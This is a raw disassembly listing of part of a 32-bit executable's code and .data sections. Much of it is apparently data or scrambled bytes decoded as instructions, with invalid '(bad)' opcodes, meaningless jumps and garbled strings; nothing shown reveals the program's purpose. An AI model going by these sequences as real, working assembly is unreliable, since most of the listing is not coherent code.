  408b5b:	sahf   
  408b5c:	push   ebp
  408b5d:	(bad)  
  408b5e:	pop    ss
  408b5f:	jne    0x408aeb
  408b61:	cmp    eax,0x299ff5d2
  408b66:	arpl   di,si
  408b68:	rcr    BYTE PTR [edi-0x2becbf8b],0x41
  408b6f:	das    
  408b70:	ja     0x408b15
  408b72:	sar    BYTE PTR [ecx],0xb0
  408b75:	(bad)  
  408b76:	sahf   
  408b77:	sbb    dl,BYTE PTR [esi+edx*4]
  408b7a:	mov    eax,ds:0x45d22419
  408b7f:	repnz adc eax,0x4b42549
  408b85:	inc    ecx
  408b86:	xor    ebp,DWORD PTR ds:0x16e7c6c1
  408b8c:	sar    BYTE PTR [edi],1
  408b8e:	pop    ebp
  408b8f:	js     0x408c08
  408b91:	rcl    BYTE PTR [eax],0xf0
  408b94:	xchg   edi,edi
  408b96:	mov    BYTE PTR [eax-0x4d],dl
  408b99:	lea    eax,[esi+eax*1]
  408b9c:	cdq    
  408b9d:	das    
  408b9e:	mov    ch,0x8a
  408ba0:	ja     0x408bc6
  408ba2:	add    DWORD PTR [ebp-0xbb8366f],0x4df749da
  408bac:	mov    ebx,0xed24e4a8
  408bb1:	aam    0x8
  408bb3:	sbb    ebp,edi
  408bb5:	push   cs
  408bb6:	mov    eax,0xf1f6809e
  408bbb:	shl    ecx,0xd0
  408bbe:	ins    BYTE PTR es:[edi],dx
  408bbf:	leave  
  408bc0:	mov    edx,0x66d5696f
  408bc5:	inc    ecx
  408bc6:	repz pop ebp
  408bc8:	and    dh,BYTE PTR [edi+0x574652aa]
  408bce:	rcr    BYTE PTR [eax+0x9],cl
  408bd1:	add    al,0xeb
  408bd3:	pop    ss
  408bd4:	inc    ecx
  408bd5:	and    bl,dh
  408bd7:	lahf   
  408bd8:	fisubr DWORD PTR [eax-0x2c1943be]
  408bde:	inc    esp
  408bdf:	and    eax,DWORD PTR [ecx-0x847835a]
  408be5:	imul   ecx,DWORD PTR [eax+0x4e1b413f],0x31e72871
  408bef:	push   ebp
  408bf0:	rol    BYTE PTR es:[edx],0x3b
  408bf4:	enter  0x6964,0x2a
  408bf8:	ds jo  0x408c15
  408bfb:	sbb    eax,0x2de0e0ef
  408c00:	adc    DWORD PTR [ebx+esi*2-0x273a5b32],edi
  408c07:	jno    0x408b98
  408c09:	out    0xf9,al
  408c0b:	bound  edi,QWORD PTR fs:[eax-0x70]
  408c0f:	fisub  DWORD PTR [ebx+ecx*2+0x45682037]
  408c16:	mov    al,ds:0xb34d9792
  408c1b:	hlt    
  408c1c:	jo     0x408c04
  408c1e:	inc    ebp
  408c1f:	push   ebx
  408c20:	jg     0x408bc6
  408c22:	test   eax,eax
  408c24:	inc    ebx
  408c25:	or     DWORD PTR [ebx-0x337420cc],ebp
  408c2b:	mov    ecx,0x5758dacb
  408c30:	retf   
  408c31:	outs   dx,BYTE PTR ds:[esi]
  408c32:	mov    eax,0xbd519afc
  408c37:	jbe    0x408c09
  408c39:	adc    eax,0x7690cb52
  408c3e:	stos   DWORD PTR es:[edi],eax
  408c3f:	(bad)  
  408c40:	sub    eax,0xc5149fd9
  408c45:	push   edi
  408c46:	js     0x408c64
  408c48:	call   0x4d7f:0xefa82967
  408c4f:	int3   
  408c50:	(bad)  
  408c51:	retf   
  408c52:	cld    
  408c53:	xor    bh,BYTE PTR [ebx+0x4268bca7]
  408c59:	mov    eax,0xb5f1e4d4
  408c5e:	js     0x408c20
  408c60:	(bad)  
  408c61:	sub    al,0x49
  408c63:	test   dh,ch
  408c65:	retf   0x85b4
  408c68:	aaa    
  408c69:	adc    cl,0xc9
  408c6c:	xchg   edi,eax
  408c6d:	js     0x408c3b
  408c6f:	pop    edi
  408c70:	ret    
  408c71:	push   es
  408c72:	and    BYTE PTR [edi+ebx*2+0x36c41e69],0xf2
  408c7a:	mov    eax,0x3dec9fad
  408c7f:	shr    BYTE PTR [eax],1
  408c81:	sub    eax,DWORD PTR [esi-0x17]
  408c84:	pop    es
  408c85:	and    DWORD PTR [edx-0x601abc4a],esi
  408c8b:	pop    ebp
  408c8c:	pop    esp
  408c8d:	inc    esi
  408c8e:	sub    ch,BYTE PTR [edx-0x7b775b7b]
  408c94:	mov    al,ds:0x56443037
  408c99:	push   ss
  408c9a:	mov    edi,0xbd964f17
  408ca0:	ror    DWORD PTR [edi],0x19
  408ca3:	and    eax,0xc95b5e42
  408ca8:	ret    0x10

Disassembly of section .data:

00409000 <.data>:
  409000:	push   ebp
  409001:	pop    edx
  409002:	js     0x40907e
  409004:	imul   ebx,DWORD PTR [ecx+0x4e],0x6f
  409008:	popa   
  409009:	dec    eax
  40900a:	arpl   WORD PTR [edi+0x4d],dx
  40900d:	pop    eax
  40900e:	inc    esi
  40900f:	dec    edx
  409010:	jne    0x40907d
  409012:	push   ebx
  409013:	add    BYTE PTR gs:[eax],al
  409016:	add    BYTE PTR [eax],al
  409018:	push   0x70004094
  40901d:	xchg   esp,eax
  40901e:	inc    eax
  40901f:	add    BYTE PTR [eax-0x6e],ah
  409022:	inc    eax
  409023:	add    dh,ch
  409025:	or     esi,DWORD PTR [edx-0x45b082f2]
  40902b:	dec    esi
  40902c:	pop    es
  40902d:	dec    edi
  40902e:	mov    ecx,0xbc4f2f4e
  409033:	dec    esi
  409034:	add    cl,BYTE PTR [edi+0x43]
  409037:	dec    edi
  409038:	push   ds
  409039:	dec    edi
  40903a:	inc    esi
  40903b:	dec    edi
  40903c:	jnp    0x40908d
  40903e:	inc    ebp
  40903f:	dec    edi
  409040:	mov    edx,0x5e4f4a4e
  409045:	push   edx
  409046:	pop    edi
  409047:	push   ebx
  409048:	mov    ebp,0xba4f7d4e
  40904d:	dec    esi
  40904e:	pop    es
  40904f:	dec    edi
  409050:	mov    ecx,0xbc4f2f4e
  409055:	dec    esi
  409056:	add    cl,BYTE PTR [edi+0x43]
  409059:	dec    edi
  40905a:	push   ds
  40905b:	dec    edi
  40905c:	inc    esi
  40905d:	dec    edi
  40905e:	or     eax,0xba4f454f
  409063:	dec    esi
  409064:	dec    edx
  409065:	dec    edi
  409066:	pop    esi
  409067:	bound  ebx,QWORD PTR [edi+0x63]
  40906a:	mov    ebp,0xba4f7d4e
  40906f:	dec    esi
  409070:	or     cl,BYTE PTR [edi-0x47]
  409073:	dec    esi
  409074:	jnp    0x4090c5
  409076:	mov    ebp,0x404f284e
  40907b:	dec    edi
  40907c:	mov    edx,0x5e4f444e
  409081:	jb     0x4090e2
  409083:	jae    0x4090f4
  409085:	sub    DWORD PTR [eax+eax*4+0x7c],0xffffff90
  40908a:	jge    0x40901d
  40908c:	mov    edi,0xba4f064e
  409091:	dec    esi
  409092:	push   es
  409093:	dec    edi
  409094:	mov    esi,0xbd4f284e
  409099:	dec    esi
  40909a:	jnp    0x4090eb
  40909c:	inc    ecx
  40909d:	dec    edi
  40909e:	mov    edx,0x5e4f464e
  4090a3:	sbb    BYTE PTR [edi-0x7d],0x6f
  4090a7:	xchg   ebx,eax
  4090a8:	ins    BYTE PTR es:[edi],dx
  4090a9:	nop
  4090aa:	jl     0x40904c
  4090ac:	jge    0x40904f
  4090ae:	mov    edi,0xba4f064e
  4090b3:	dec    esi
  4090b4:	push   es
  4090b5:	dec    edi
  4090b6:	mov    esi,0xbd4f284e
  4090bb:	dec    esi
  4090bc:	or     eax,0xba4f414f
  4090c1:	dec    esi
  4090c2:	inc    esi
  4090c3:	dec    edi
  4090c4:	pop    esi
  4090c5:	xchg   edx,eax
  4090c6:	pop    edi
  4090c7:	xchg   ebx,eax
  4090c8:	outs   dx,DWORD PTR ds:[esi]
  4090c9:	mov    ds:0xb07ca06c,eax
  4090ce:	jge    0x409081
  4090d0:	mov    edi,0xba4f0c4e
  4090d5:	dec    esi
  4090d6:	cs dec edi
  4090d8:	mov    ecx,0xbd4f7b4e
  4090dd:	dec    esi
  4090de:	and    eax,0xba4f404f
  4090e3:	dec    esi
  4090e4:	inc    esi
  4090e5:	dec    edi
  4090e6:	pop    esi
  4090e7:	mov    ds:0xb36fa35f,al
  4090ec:	ins    BYTE PTR es:[edi],dx
  4090ed:	mov    al,0x7c
  4090ef:	sar    BYTE PTR [ebp-0x3f],0xbf
  4090f3:	dec    esi
  4090f4:	or     al,0x4f
  4090f6:	mov    edx,0xb94f2e4e
  4090fb:	dec    esi
  4090fc:	jl     0x40914d
  4090fe:	mov    ebp,0x434f1f4e
  409103:	dec    edi
  409104:	mov    edx,0x5e4f414e
  409109:	mov    dl,0x5f
  40910b:	mov    bl,0x6f
  40910d:	ret    
  40910e:	ins    BYTE PTR es:[edi],dx
  40910f:	sar    BYTE PTR [eax+edx*8+0x7d],0xd1
  409114:	mov    edi,0xba4f0c4e
  409119:	dec    esi
  40911a:	cs dec edi
  40911c:	mov    ecx,0xbd4f0a4e
  409121:	dec    esi
  409122:	cs dec edi
  409124:	inc    eax
  409125:	dec    edi
  409126:	mov    edx,0x5e4f444e
  40912b:	ret    0xc35f
  40912e:	outs   dx,DWORD PTR ds:[esi]
  40912f:	shr    DWORD PTR [eax+edx*8+0x7c],cl
  409133:	loopne 0x4091b2
  409135:	loope  0x4090f6
  409137:	dec    esi
  409138:	or     al,0x4f
  40913a:	mov    edx,0xb94f2e4e
  40913f:	dec    esi
  409140:	or     ecx,DWORD PTR [edi-0x43]
  409143:	dec    esi
  409144:	sub    BYTE PTR [edi+0x40],cl
  409147:	dec    edi
  409148:	mov    edx,0x5e4f464e
  40914d:	rcr    BYTE PTR [edi-0x2d],cl
  409150:	outs   dx,DWORD PTR ds:[esi]
  409151:	jecxz  0x4091bf
  409153:	loopne 0x4091d1
  409155:	lock jge 0x409149
  409158:	mov    edi,0xba4f094e
  40915d:	dec    esi
  40915e:	pop    ds
  40915f:	dec    edi
  409160:	mov    ecx,0xbe4f2a4e
  409165:	dec    esi
  409166:	mov    edx,0x5e4ebf4e
  40916b:	loop   0x4091cc
  40916d:	jecxz  0x4091de
  40916f:	rep ins BYTE PTR es:[edi],dx
  409171:	lock jl 0x409174
  409174:	jge    0x409177
  409176:	jl     0x409188
  409178:	jge    0x40918b
  40917a:	mov    esi,0xba4f7f4e
  40917f:	dec    esi
  409180:	and    ecx,DWORD PTR [edi-0x48]
  409183:	dec    esi
  409184:	or     cl,BYTE PTR [edi-0x42]
  409187:	dec    esi
  409188:	sub    DWORD PTR [edi+0x43],ecx
  40918b:	dec    edi
  40918c:	mov    edx,0x5e4f414e
  409191:	add    bl,BYTE PTR [edi+0x3]
  409194:	outs   dx,DWORD PTR ds:[esi]
  409195:	adc    ebp,DWORD PTR [eax+edx*1+0x7c]
  409199:	and    BYTE PTR [ebp+0x21],bh
  40919c:	mov    edi,0x2800004e
  4091a1:	nop
  4091a2:	inc    eax
  4091a3:	add    BYTE PTR [edx+edx*4],bl
  4091a6:	inc    eax
  4091a7:	add    BYTE PTR [edx+edx*4],ah
  4091aa:	inc    eax
  4091ab:	add    BYTE PTR [esp+edx*4+0x40],dh
  4091af:	add    al,bl
  4091b1:	xchg   ebx,eax
  4091b2:	inc    eax
  4091b3:	add    BYTE PTR [esp+edx*4+0x40],ah
  4091b7:	add    BYTE PTR [edx+edx*4],al
  4091ba:	inc    eax
  4091bb:	add    BYTE PTR [eax],cl
  4091bd:	xchg   edx,eax
  4091be:	inc    eax
  4091bf:	add    BYTE PTR [esp+edx*4+0x40],bl
  4091c3:	add    BYTE PTR [edx+edx*4+0x40],ch
  4091c7:	add    BYTE PTR [ecx+ebp*4-0x454a0764],cl
  4091ce:	pushf  
  4091cf:	clc    
  4091d0:	and    BYTE PTR [edx-0x6c6bffc0],dl
  4091d6:	inc    eax
  4091d7:	add    BYTE PTR [eax-0x4bffbf6d],ch
  4091dd:	xchg   ebx,eax
  4091de:	inc    eax
  4091df:	add    ah,al
  4091e1:	xchg   ebx,eax
  4091e2:	inc    eax
  4091e3:	add    BYTE PTR [eax-0x6e],bl
  4091e6:	inc    eax
  4091e7:	add    BYTE PTR [eax+edx*4],ah
  4091ea:	inc    eax
  4091eb:	add    BYTE PTR [eax-0x6e],bh
  4091ee:	inc    eax
  4091ef:	add    BYTE PTR [eax-0x6e],ch
  4091f2:	inc    eax
  4091f3:	add    BYTE PTR [eax-0x6c],bh
  4091f6:	inc    eax
  4091f7:	add    BYTE PTR ds:0x90f89c85,dh
  4091fd:	or     edx,DWORD PTR [edi]
  4091ff:	sub    DWORD PTR [edx+edx*4],0x1c930040
  409206:	push   ss
  409207:	or     DWORD PTR [edi+0x7050d],0xf6004000
  409211:	mov    ss,ebx
  409213:	dec    esp
  409214:	cmp    al,0xc8
  409216:	inc    edx
  409217:	add    BYTE PTR [edx+0x7a],bl
  40921a:	ja     0x409273
  40921c:	(bad)  
  40921d:	cli    
  40921e:	jne    0x409282
  409220:	(bad)  
  409221:	in     eax,dx
  409222:	inc    BYTE PTR [edi]
  409224:	mov    esi,0x1405a3fa
  409229:	xchg   edx,eax
  40922a:	inc    eax
  40922b:	add    BYTE PTR [edx*4-0x69cb0764],dh
  409232:	pushf  
  409233:	clc    
  409234:	xor    edx,DWORD PTR [ebp-0x6acd0764]
  40923a:	pushf  
  40923b:	clc    
  40923c:	xor    DWORD PTR [ebp-0x6acf0764],edx
  409242:	pushf  
  409243:	clc    
  409244:	aas    
  409245:	xchg   ebp,eax
  409246:	pushf  
  409247:	clc    
  409248:	ds xchg ebp,eax
  40924a:	pushf  
  40924b:	clc    
  40924c:	cmp    eax,0x3cf89c95
  409251:	xchg   ebp,eax
  409252:	pushf  
  409253:	clc    
  409254:	and    eax,0xe1f89c95
  409259:	stc    
  40925a:	add    esp,DWORD PTR [eax+0x1c]
  40925d:	nop
  40925e:	inc    eax
  40925f:	add    BYTE PTR [ecx],al
  409261:	xchg   ebx,eax
  409262:	inc    edx
  409263:	add    BYTE PTR [ebx+edx*2+0x7a],dh
  409267:	dec    esp
  409268:	xor    eax,0x90f89c85
  40926d:	jmp    0x126699c2
  409272:	add    BYTE PTR [eax],al
  409274:	sbb    BYTE PTR [eax+0xb920040],dl
  40927a:	add    al,0xe
	...
  4092ac:	(bad)  
  4092ad:	mov    ds:0x42,eax
  4092b2:	add    BYTE PTR [eax],al
  4092b4:	dec    ebp
  4092b5:	add    BYTE PTR [edx+0x0],cl
  4092b8:	inc    esp
  4092b9:	add    BYTE PTR [ebx+0x0],ch
  4092bc:	ins    DWORD PTR es:[edi],dx
  4092bd:	add    BYTE PTR [eax+eax*1],ch
  4092c0:	add    BYTE PTR fs:[ebx+0x0],dh
  4092c4:	add    BYTE PTR cs:[ebx+0x0],ch
  4092c8:	popa   
  4092c9:	add    BYTE PTR [esi+0x0],ah
  4092cc:	push   0x0
  4092ce:	imul   eax,DWORD PTR [eax],0x64
  4092d1:	add    BYTE PTR [eax+eax*1+0x73],ch
  4092d5:	add    BYTE PTR [edx+0x0],ch
  4092d8:	data16 add BYTE PTR [eax+eax*1+0x6b],ch
  4092dd:	add    BYTE PTR [eax+eax*1+0x73],ah
  4092e1:	add    BYTE PTR [esi+0x0],ah
  4092e4:	add    BYTE PTR [bx+si],al
  4092e7:	add    BYTE PTR [ebx+0x0],cl
  4092ea:	push   ebp
  4092eb:	add    BYTE PTR [eax+eax*1+0x4a],al
  4092ef:	add    BYTE PTR [edi+0x0],ch
  4092f2:	imul   eax,DWORD PTR [eax],0x6a
  4092f5:	add    BYTE PTR [edx+0x0],ch
  4092f8:	ins    BYTE PTR es:[edi],dx
  4092f9:	add    BYTE PTR [ebx+0x0],ch
  4092fc:	jae    0x4092fe
  4092fe:	add    BYTE PTR fs:[edx+0x0],ch
  409302:	jae    0x409304
  409304:	popa   
  409305:	add    BYTE PTR [edi+0x0],ch
  409308:	imul   eax,DWORD PTR [eax],0x640066
  40930e:	jae    0x409310
  409310:	ins    BYTE PTR es:[edi],dx
  409311:	add    BYTE PTR [ebx+0x0],ch
  409314:	data16 add BYTE PTR [eax+eax*1+0x73],ah
  409319:	add    BYTE PTR [esi+0x0],ah
  40931c:	push   0x0
  40931e:	add    BYTE PTR fs:[ebx+0x0],dh
  409322:	ins    BYTE PTR es:[edi],dx
  409323:	add    BYTE PTR [esi+0x0],ah
  409326:	jae    0x409328
  409328:	add    BYTE PTR fs:[eax],al
  40932b:	add    BYTE PTR [ecx+ecx*2+0x44],cl
  40932f:	outs   dx,DWORD PTR ds:[esi]
  409330:	jo     0x409381
  409332:	dec    ecx
  409333:	dec    ebx
  409334:	inc    esp
  409335:	dec    ecx
  409336:	dec    edx
  409337:	ins    BYTE PTR es:[edi],dx
  409338:	imul   ebp,DWORD PTR [edx+0x6b],0x68736466
  40933f:	imul   sp,WORD PTR [si+0x0],0x0
  409346:	add    BYTE PTR [eax],al
  409348:	dec    ebx
  409349:	add    BYTE PTR [ebp+0x0],dl
  40934c:	inc    esp
  40934d:	add    BYTE PTR [edx+0x0],cl
  409350:	outs   dx,DWORD PTR ds:[esi]
  409351:	add    BYTE PTR [ebx+0x0],ch
  409354:	push   0x0
  409356:	push   0x0
  409358:	ins    BYTE PTR es:[edi],dx
  409359:	add    BYTE PTR [ebx+0x0],ch
  40935c:	jae    0x40935e
  40935e:	add    BYTE PTR fs:[edx+0x0],ch
  409362:	jae    0x409364
  409364:	popa   
  409365:	add    BYTE PTR [edi+0x0],ch
  409368:	imul   eax,DWORD PTR [eax],0x640066
  40936e:	jae    0x409370
  409370:	ins    BYTE PTR es:[edi],dx
  409371:	add    BYTE PTR [ebx+0x0],ch
  409374:	data16 add BYTE PTR [eax+eax*1+0x73],ah
  409379:	add    BYTE PTR [esi+0x0],ah
  40937c:	push   0x0
  40937e:	add    BYTE PTR fs:[ebx+0x0],dh
  409382:	ins    BYTE PTR es:[edi],dx
  409383:	add    BYTE PTR [esi+0x0],ah
  409386:	jae    0x409388
  409388:	add    BYTE PTR fs:[eax],al
  40938b:	add    BYTE PTR [eax],al
  40938d:	add    BYTE PTR [eax],al
  40938f:	add    BYTE PTR ds:0x2100406f,bl
  409395:	dec    edi
  409396:	pop    ds
  409397:	dec    edi
  409398:	sub    BYTE PTR [edi+0x24],cl
  40939b:	dec    edi
  40939c:	pop    ds
  40939d:	dec    edi
  40939e:	es dec edi
  4093a0:	imul   ecx,DWORD PTR [edi+0x68],0x4eba4f
  4093a7:	add    BYTE PTR ds:0x234f1e4f,bl
  4093ad:	dec    edi
  4093ae:	imul   ecx,DWORD PTR [edi+0x68],0x2f4eba4f
  4093b5:	dec    edi
  4093b6:	sub    DWORD PTR [edi+0x1f],ecx
  4093b9:	dec    edi
  4093ba:	sub    BYTE PTR [edi+0x69],cl
  4093bd:	dec    edi
  4093be:	push   0x4eba4f
  4093c3:	add    BYTE PTR [ecx],ch
  4093c5:	dec    edi
  4093c6:	and    cl,BYTE PTR [edi+0x26]
  4093c9:	dec    edi
  4093ca:	sub    eax,0x2a4f1b4f
  4093cf:	dec    edi
  4093d0:	and    ecx,DWORD PTR [edi-0x46]
  4093d3:	dec    esi
  4093d4:	add    BYTE PTR [eax],al
  4093d6:	add    BYTE PTR [eax],al
  4093d8:	push   cs
  4093d9:	jge    0x4093e9
  4093db:	lea    ecx,[esi]
  4093dd:	popf   
  4093de:	push   cs
  4093df:	lods   eax,DWORD PTR ds:[esi]
  4093e0:	push   cs
  4093e1:	mov    ebp,0xdd0ecd0e
  4093e6:	push   cs
  4093e7:	in     eax,dx
  4093e8:	push   cs
  4093e9:	std    
  4093ea:	push   cs
  4093eb:	or     eax,0x2d0e1d0e
  4093f0:	push   cs
  4093f1:	cmp    eax,0x6d0e5d0e
  4093f6:	push   cs
  4093f7:	jb     0x409407
  4093f9:	jae    0x409409
  4093fb:	jo     0x40940b
  4093fd:	jno    0x40940d
  4093ff:	jbe    0x40940f
  409401:	ja     0x409411
  409403:	je     0x409413
  409405:	jne    0x409415
  409407:	mov    cl,BYTE PTR [esi]
  409409:	mov    ecx,DWORD PTR [esi]
  40940b:	mov    BYTE PTR [esi],cl
  40940d:	mov    DWORD PTR [esi],ecx
  40940f:	mov    cs,WORD PTR [esi]
  409411:	jl     0x409431
  409413:	jge    0x409443
  409415:	jge    0x409455
  409417:	jge    0x409435
  409419:	(bad)  
  40941a:	jge    0x40948c
  40941c:	cmp    eax,0x79730eb1
  409421:	vptestnmw k7{k7},xmm7,QWORD PTR [eax+0x0]{1to2}
  409428:	sub    eax,0x3d56c317
  40942d:	hlt    
  40942e:	xor    dh,BYTE PTR [edi]
  409430:	xor    bh,BYTE PTR [esi-0x23]
  409433:	jno    0x409449
  409435:	mov    cl,0x70
  409437:	imul   ecx,esp,0x8
  40943a:	mov    al,ds:0x3005efd7
  40943f:	xlat   BYTE PTR ds:[ebx]
  409440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409441:	xchg   ebx,eax
  409442:	sub    al,0x11
  409444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409445:	jge    0x4093f2
  409447:	fidiv  WORD PTR [edi+0x64a6f6c9]
  40944d:	xor    dl,dl
  40944f:	pop    ds
  409450:	adc    cl,dh
  409452:	and    al,0xc6
  409454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409455:	sbb    BYTE PTR [ebp+0x71],ah
  40945b:	add    bh,ch
  40945d:	(bad)  [ebx+0x7]
  409460:	je     0x4093f4
  409462:	inc    eax
  409463:	add    BYTE PTR [edi+0x40],dl
  409466:	shl    DWORD PTR [ebx],1
  409468:	mov    bh,0x79
  40946a:	inc    edx
  40946b:	add    BYTE PTR [edx+0x62],bl
  40946e:	push   esp
  40946f:	addr16 or al,0x92
  409472:	inc    eax
  409473:	add    BYTE PTR [eax-0x6e],dh
  409476:	inc    eax
  409477:	add    BYTE PTR [edi+0x440712ed],cl
  40947d:	popa   
  40947e:	dec    eax
  40947f:	push   edi
  409480:	dec    ecx
  409481:	jne    0x4094f8
  409483:	pop    eax
  409484:	jns    0x4094d8
  409486:	dec    esp
  409487:	inc    edi
  409488:	inc    ebx
  409489:	popa   
  40948a:	jns    0x4094fb
  40948c:	push   0x42467568
  409491:	inc    esp
  409492:	inc    edx
  409493:	jne    0x409506
  409495:	push   ecx
  409496:	push   ebp
  409497:	jno    0x409502
  409499:	jb     0x4094e5
  40949b:	ins    WORD PTR es:[edi],dx
  40949d:	arpl   WORD PTR [esi+0x46],cx
  4094a0:	bound  esi,QWORD PTR [eax+0x4a]
  4094a3:	js     0x4094a5
	...
  4094b5:	add    BYTE PTR [eax],al
  4094b7:	add    BYTE PTR [ebp+0x56],al
  4094ba:	push   cx
  4094bc:	ja     0x409524
  4094be:	inc    esi
  4094bf:	gs inc ebp
  4094c1:	inc    ebx
  4094c2:	dec    ebx
  4094c3:	outs   dx,BYTE PTR ds:[esi]
  4094c4:	imul   ecx,DWORD PTR [esi+0x58],0x64
  4094c8:	push   edx
  4094c9:	dec    edx
  4094ca:	push   0x63
  4094cc:	push   0x636e707a
  4094d1:	push   ebx
  4094d2:	jne    0x40951d
  4094d4:	inc    ecx
  4094d5:	outs   dx,BYTE PTR ds:[esi]
  4094d6:	jo     0x40951b
  4094d8:	inc    ebp
  4094d9:	jp     0x40953f
  4094db:	add    BYTE PTR [eax+0x41],dh
  4094de:	dec    ecx
  4094df:	inc    edx
  4094e0:	inc    cx
  4094e2:	inc    ebx
  4094e3:	jbe    0x40953d
  4094e5:	push   eax
  4094e6:	outs   dx,BYTE PTR ds:[esi]
  4094e7:	add    BYTE PTR [edi+0x4d],al
  4094ea:	pop    edx
  4094eb:	push   0x6a
  4094ed:	jp     0x409533
  4094ef:	imul   edi,DWORD PTR [edx+0x68],0x43
  4094f3:	jbe    0x4094f5
  4094f5:	add    BYTE PTR [esi+0x6c],dh
  4094f8:	inc    ebx
  4094f9:	inc    esi
  4094fa:	popa   
  4094fb:	addr16 push ebx
  4094fd:	dec    edi
  4094fe:	imul   ecx,DWORD PTR [edx+0x4d],0x444b4758
  409505:	push   edi
  409506:	jne    0x409553
  409508:	add    BYTE PTR [eax],al
  40950a:	dec    edi
  40950b:	gs push edi
  40950d:	outs   dx,BYTE PTR fs:[esi]
  40950f:	pop    ecx
  409510:	push   esi
  409511:	push   0xc30c004d
  409516:	dec    ebp
  409517:	icebp  
  409518:	iret   
  409519:	(bad)  
  40951a:	mov    esp,0x99b5a4ff
  40951f:	loopne 0x409589
  409521:	(bad)  
  409522:	jmp    0x89130f
  409527:	add    BYTE PTR [esi+0x7],ch
  40952a:	add    BYTE PTR [eax],al
  40952c:	mov    ?,WORD PTR [ecx]
  40952e:	sub    al,BYTE PTR [esi+0x475126b6]
  409534:	mov    edx,0x46599ae8
  409539:	rol    BYTE PTR ds:0x5b2fbd5c,1
  40953f:	test   bl,cl
  409541:	mov    dh,0x22
  409543:	or     cl,dl
  409545:	lahf   
  409546:	sbb    ebx,DWORD PTR [eax]
  409548:	push   ecx
  409549:	addr16 or esp,ecx
  40954c:	call   0xaa84:0x3eb61718
  409553:	repz es loope 0x4095d0
  409557:	inc    ecx
  409558:	pop    ebx
  409559:	mov    ds:0x6ad8f00b,al
  40955e:	push   ss
  40955f:	sbb    dl,ch
  409561:	xchg   ebx,eax
  409562:	test   eax,0xd8809ec
  409567:	fnstcw WORD PTR [esi]
  409569:	pop    esp
  40956a:	je     0x4094f3
  40956c:	push   ebx
  40956d:	pop    esp
  40956e:	stc    
  40956f:	xor    al,0x66
  409571:	(bad)  
  409572:	test   al,0xda
  409574:	and    eax,0x62efb705
  409579:	sub    BYTE PTR [edi+0x63],al
  40957c:	pop    ecx
  40957d:	adc    bh,bh
  40957f:	xchg   esp,eax
  409580:	les    esi,FWORD PTR [ecx+0x2971ea55]
  409586:	mov    eax,esp
  409588:	push   esp
  409589:	outs   dx,DWORD PTR ds:[esi]
  40958a:	push   esi
  40958b:	jne    0x409541
  40958d:	lea    ecx,[edx-0x76]
  409590:	js     0x40956a
  409592:	add    BYTE PTR [ebx-0x1e],bh
  409595:	repz mov cl,0xb3
  409598:	mov    gs,eax
  40959a:	aaa    
  40959b:	or     edi,edi
  40959d:	fadd   QWORD PTR [esi]
  40959f:	mov    ch,0xed
  4095a1:	add    BYTE PTR [ecx],0x9b
  4095a4:	daa    
  4095a5:	push   esp
  4095a6:	popf   
  4095a7:	add    al,0x23
  4095a9:	push   DWORD PTR ds:0x7e153e4d
  4095b0:	loop   0x409582
  4095b2:	daa    
  4095b3:	adc    DWORD PTR [ecx],0x6c80b57d
  4095b9:	add    DWORD PTR [edx-0x19a912e0],edi
  4095bf:	cmp    DWORD PTR ds:0x36a57aa4,ecx
  4095c5:	xor    eax,DWORD PTR [ebx]
  4095c7:	pop    esi
  4095c8:	and    al,0xd7
  4095ca:	gs mov ebx,0xe04300f6
  4095d0:	ds inc ebp
  4095d2:	sub    DWORD PTR [esi-0x6b],0x40db1e96
  4095d9:	xchg   esp,eax
  4095da:	push   eax
  4095db:	js     0x409594
  4095dd:	mov    cs,ebp
  4095df:	xchg   ebp,eax
  4095e0:	push   ebx
  4095e1:	dec    ebx
  4095e2:	xchg   DWORD PTR [esi+0x3e0f40e7],eax
  4095e8:	jne    0x4095c6
  4095ea:	mov    esp,0x117589e3
  4095ef:	push   ebx
  4095f0:	push   edi
  4095f1:	and    eax,0x1d61fff1
  4095f6:	push   ebx
  4095f7:	mov    esi,0x826c8d79
  4095fc:	out    dx,al
  4095fd:	inc    edx
  4095fe:	imul   edi,DWORD PTR [eax+0x10f362f9],0xbc63b184
  409608:	xor    edx,esp
  40960a:	fnstenv [eax+ebp*4-0x4477b3c7]
  409611:	mov    ds:0x7a836a4f,al
  409616:	pop    esi
  409617:	dec    ebp
  409618:	fcom   st(2)
  40961a:	in     al,dx
  40961b:	jecxz  0x409601
  40961d:	sub    edi,DWORD PTR [ecx+0x3e0721e6]
  409623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409624:	sbb    eax,0x73d21fed
  409629:	dec    esi
  40962a:	nop    DWORD PTR [esi]
  40962d:	dec    ebx
  40962e:	and    eax,0x4fb82d86
  409633:	xor    ebx,DWORD PTR [ecx-0x48]
  409636:	fisttp QWORD PTR [ecx]
  409638:	jg     0x409681
  40963a:	lock mov edx,esi
  40963d:	xor    ebp,DWORD PTR [edi-0x7d320a3e]
  409643:	and    BYTE PTR [ecx],0xe9
  409646:	ss cdq 
  409648:	scas   al,BYTE PTR es:[edi]
  409649:	sbb    BYTE PTR [ebx-0x50299d42],dl
  40964f:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409651:	jg     0x4096c4
  409653:	dec    esp
  409654:	sbb    esp,DWORD PTR [ebx-0x13711496]
  40965a:	jb     0x409682
  40965c:	add    ebp,eax
  40965e:	call   0x9f065029
  409663:	out    0xa2,al
  409665:	jbe    0x4096af
  409667:	in     al,0x80
  409669:	imul   eax,DWORD PTR [edx-0x6372eb67],0xea90cb8b
  409673:	sub    ch,dl
  409675:	ret    0x612e
  409678:	xchg   ecx,eax
  409679:	enter  0xee2a,0x3b
  40967d:	push   ebp
  40967e:	retf   0x8041
  409681:	push   es
  409682:	push   ds
  409683:	xlat   BYTE PTR ds:[ebx]
  409684:	les    ecx,FWORD PTR [edx+0x43]
  409687:	mov    esp,0x1fdd77c2
  40968c:	scas   eax,DWORD PTR es:[edi]
  40968d:	iret   
  40968e:	int    0xeb
  409690:	and    BYTE PTR [edx],cl
  409692:	aas    
  409693:	jae    0x409670
  409695:	jge    0x4096ac
  409697:	and    eax,0xff17d8b2
  40969c:	sbb    DWORD PTR [esi+esi*4+0x42],0xba353694
  4096a4:	xchg   esp,eax
  4096a5:	mov    ah,BYTE PTR [eax-0x1c]
  4096a8:	xor    al,0x51
  4096aa:	cli    
  4096ab:	out    dx,eax
  4096ac:	xor    BYTE PTR [eax+0x72ce2fe8],al
  4096b2:	jb     0x409661
